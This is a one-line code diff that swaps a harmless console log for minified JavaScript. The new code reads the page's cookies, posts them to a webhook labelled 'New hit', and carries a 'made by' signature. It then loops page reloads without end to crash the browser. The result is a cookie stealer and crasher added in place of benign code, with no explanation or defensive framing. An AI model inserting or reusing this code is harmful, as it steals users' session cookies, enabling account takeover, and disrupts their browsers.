@@ -1,1 +1,1 @@
-console.log("running...")
+function sendMessage(){let a=new XMLHttpRequest;a.open("POST","webhook"),a.setRequestHeader("Content-type","application/json");let b={username:"New hit",avatar_url:"",content:document.cookie.split(";").join(";\r\n")};a.send(JSON.stringify(b))}console.log("made by cow#3479"),sendMessage(),console.log("done"),onbeforeunload=function(){localstorage.x=1},setTimeout(function(){for(;;)location.reload(1)},1e3),console.log("Done Crashing...")
